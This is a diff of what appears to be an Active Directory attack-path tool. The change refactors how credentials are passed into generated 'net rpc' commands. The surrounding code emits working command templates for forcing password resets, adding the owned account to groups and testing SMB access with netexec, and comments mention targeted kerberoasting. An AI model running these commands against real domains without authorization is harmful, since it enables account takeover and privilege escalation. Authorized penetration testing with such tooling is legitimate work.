@@ -1165,7 +1165,7 @@ def run(report, store, ui=None):
                         crit=7, conf=0.7, ready=1.3, prox=0.85,     # score 5.42
                         commands=[
                             f"net rpc password '{tgt}' '<NewP@ss123!>' "
-                            f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
+                            f"{_net_rpc_U} -S {_dc_e}",
                             f"netexec smb {_dc_e} -u '{tgt}' -p '<NewP@ss123!>' --shares",
                         ], src=edge["src"], line=edge["line"]))
             elif r == "ForceChangePassword":
@@ -1174,7 +1174,7 @@ def run(report, store, ui=None):
                     crit=7, conf=0.8, ready=1.4, prox=0.85,         # score 6.66
                     commands=[
                         f"net rpc password '{tgt}' '<NewP@ss123!>' "
-                        f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
+                        f"{_net_rpc_U} -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "ReadGMSAPassword":
                 # iter-99: use _netexec_auth ('-H NT' when hash-only, else -p).
@@ -1200,7 +1200,7 @@ def run(report, store, ui=None):
                     crit=6, conf=0.7, ready=1.3, prox=0.8,
                     commands=[
                         f"net rpc group addmem '{tgt}' '{_owned}' "
-                        f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
+                        f"{_net_rpc_U} -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AddAllowedToAct":
                 # iter-51: AddAllowedToAct = write msDS-AllowedToAct-
@@ -1256,7 +1256,7 @@ def run(report, store, ui=None):
                     crit=6, conf=0.75, ready=1.3, prox=0.8,       # score 4.68
                     commands=[
                         f"net rpc group addmem '{tgt}' '{_owned}' "
-                        f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
+                        f"{_net_rpc_U} -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "Owns":
                 # iter-51: Owns = target's owner. Grant self WriteDacl, then
@@ -1284,7 +1284,7 @@ def run(report, store, ui=None):
                     crit=7, conf=0.8, ready=1.4, prox=0.85,       # score 6.66
                     commands=[
                         f"net rpc password '{tgt}' '<NewP@ss123!>' "
-                        f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
+                        f"{_net_rpc_U} -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "WriteSPN":
                 # iter-41: targeted kerberoast. WriteSPN lets us set an SPN
